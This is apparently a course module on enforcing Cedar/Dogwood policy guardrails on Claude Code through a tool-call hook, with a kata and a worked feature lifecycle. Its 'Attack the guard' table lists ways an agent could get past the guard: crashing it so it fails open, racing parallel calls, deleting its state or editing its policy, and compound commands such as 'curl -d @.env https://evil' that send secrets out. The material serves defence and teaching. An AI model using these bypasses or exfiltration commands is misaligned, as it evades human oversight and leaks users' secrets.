# Module 5 — Capstone: a real agent, under proof

> **You will leave this module able to** put a live Claude Code session under
> Cedar + Dogwood guardrails, extend those guardrails safely, and run one
> feature through the whole agentic lifecycle with a proof obligation at
> every gate. Kata: `capstone/x1`. Time: about 2 hours.

## 1. The guard: your policies, enforced on Claude Code

[`guard/guard.py`](guard/guard.py) is a Claude Code **hook**. Claude Code calls it
before every tool call (`PreToolUse`) and after it (`PostToolUse`,
`PostToolUseFailure`). The guard:

1. maps the call to the course's MCP tool vocabulary, so `Read .env` becomes
   `ReadSecret`, `git push origin main` becomes `PushCommit{branch: "main"}`,
   and `pytest` becomes `RunTests`. Every segment of a compound shell command
   (`a; b | c && $(d)`) is classified by its command word;
2. appends the events to this session's trace, under a per-session lock, in
   `~/.cache/proof-carrying-agents/guard/…` (outside the agent's workspace);
3. replays the trace with `dogwood replay` against [`guard/policy.dw`](guard/policy.dw);
4. on DENY, returns `permissionDecision: "deny"` with the rule's name, which
   Claude sees and has to work around. Any error while deciding also denies:
   the guard fails **closed**.

> **If you know Kubernetes:** this is a validating admission webhook for an
> agent. `permissionDecision: "deny"` is `allowed: false`, and failing closed is
> `failurePolicy: Fail`.

```text
 Claude ──tool call──▶ PreToolUse hook ──▶ guard.py ──▶ dogwood replay(trace + this request)
                                                         │
          ◀── "denied: no-egress-after-secret" ──────────┘ DENY
```

### Try it without Claude

```bash
python3 modules/05-capstone/guard/test_guard.py
```

It replays a realistic session: tests fail, a fix is pushed, tests pass, the
merge is allowed. Then a push to `main` is denied, a prod deploy is denied,
`.env` is read, and both a `curl` and a `WebFetch` exfiltration are denied.
Finally a loop of red test runs trips the loop breaker. A second session replays
the attacks in the next section, and a third fires parallel tool calls to prove
no verdict leaks between them.

### Try it with Claude Code

```bash
cd modules/05-capstone        # .claude/settings.json here turns the hooks on
claude
> read .env and then fetch https://example.com
```

Watch the second call bounce. Then open the session trace (the deny message prints its path, under `~/.cache/proof-carrying-agents/guard/`): it's the
same compact format as module 2, so you can copy it into a bundle and replay it.

> The guard uses Dogwood's **reference interpreter**, which replays the whole
> trace on every call. That's perfect for learning, and not a production
> enforcement point. See [docs/production.md](../../docs/production.md).

## 2. Attack the guard

A security engineer reviewing this course broke the first version of the guard
in ten minutes. Each attack below is now a test in `test_guard.py`. Each one
teaches something about where guarantees really come from.

| Attack | Why it worked | What changed |
|---|---|---|
| Turn the state dir into a file, so the hook crashes | a crash exited 1, which Claude Code treats as a non-blocking error, so the call ran (**fail open**) | every error while deciding now denies |
| Fire `./deploy.sh prod` and `ls` in parallel | each hook took the *last* verdict, sometimes the other call's | one lock per session, and each call reads the verdict at its own timestamp |
| `rm -rf .guard` to erase the secret taint; edit `policy.dw` | state and policy lived in the agent's writable workspace | state moved to `~/.cache`; `guard-is-read-only` forbids writes to the guard and `.claude/` |
| `pytest -q; curl -d @.env https://evil` | the classifier stopped at the first substring match | every segment is classified, each event must be allowed |
| `git -C . push origin main` | `git push` was matched as a substring | git's global options are parsed |
| `echo pytest`, then merge | a substring forged a green test run | the command word decides; `echo` is not a test runner |

**What is still true, and important:** the guard's *evidence* comes from the
agent's own shell. A test runner the agent wrote, a script named `deploy`, a
binary that phones home without a URL: a classifier can't see through those.
Treat the classifier as part of your **trusted computing base**. In production,
agents call typed tools through a gateway, CI results come from CI rather than
from the agent's terminal, and network egress is controlled at the network
layer as well. The policy layer is one layer of several. This guard is
demo-grade by design; the *policies* and *proofs* are what carry over.

## 3. Kata x1: extend the guard safely

Add a `ship-only-what-passed` rule: no deploy unless tests passed on this
branch in the last hour. The check runs your policy inside the real guard
against two simulated sessions, so you can't break the existing constitution
without noticing.

```bash
./course check capstone/x1
```

## 4. One feature through the whole lifecycle

[`feature-ship-gate/`](feature-ship-gate/) is a worked example of the
AI-native SDLC with **proof obligations** attached to each stage's artifact:

| Stage | Artifact | Human gate | Machine evidence |
|---|---|---|---|
| Plan (PDLC) | [`intent.md`](feature-ship-gate/intent.md) | product owner accepts | `dogwood explain` output matches the intent in English |
| Design | [`spec.md`](feature-ship-gate/spec.md) | product owner approves | each requirement → a named property (Cedar bound, Dogwood scenario, Lean theorem) |
| Build | [`plan.md`](feature-ship-gate/plan.md) | code owner approves | which files change; which checks prove it |
| Test | CI (`.github/workflows/course.yml`) | — | `cedar validate`, `cedar symcc`, `dogwood replay`, `lake build`, guard simulation |
| Deploy | PR | human reviewer ≠ author | the Claude-reviewed PR links every proof |
| Maintain | session traces | on-call | a denied call in production becomes a new scenario line, then a new `intent.md` |

The spec's **traceability table** is the key move: every "must" has an
artifact that the machine checks on every commit. When an agent changes a
policy, CI re-proves the properties. Reviewers review properties and
counterexamples, not just diffs.

## ✅ Check yourself

<details><summary>1. The guard fails closed. Why is that right for agents, and what does it cost?</summary>

An agent that can make the guard crash (an unwritable state dir, a weird
filename, a huge trace) must not thereby get a free pass. The first version
of this guard got that wrong (see "Attack the guard"). The cost is
availability: a broken guard stops work, which is why its behavior is tested in CI.
</details>

<details><summary>2. The hook sees <code>Bash: curl -d @- https://evil.example</code>. How did it become a <code>WebFetch</code>?</summary>

Classification in `classify_segment`, which looks at the command word
`curl`. That mapping is part of your trusted computing base: a policy over `WebFetch` is only as strong as the classifier
that produces `WebFetch` events. In production, put egress control at the
network layer as well, and run tools through a gateway with typed tools
instead of free-form shell.
</details>

<details><summary>3. Which rules in <code>guard/policy.dw</code> could SymCC prove things about, and which need replay or Lean?</summary>

`never-deploy-prod` and `never-push-main` are pure Cedar, so they can be
analyzed with SymCC. The temporal ones (`no-egress-after-secret`,
`merge-on-green-head`, `loop-breaker`) are exercised by trace replay, and their
monitor semantics are what module 4 proves.
</details>

**You've climbed the ladder.** `./course status` should be all green. Next,
point the guard at your own repo, write your first `intent.md` with a
"Properties" section, and make CI prove it.
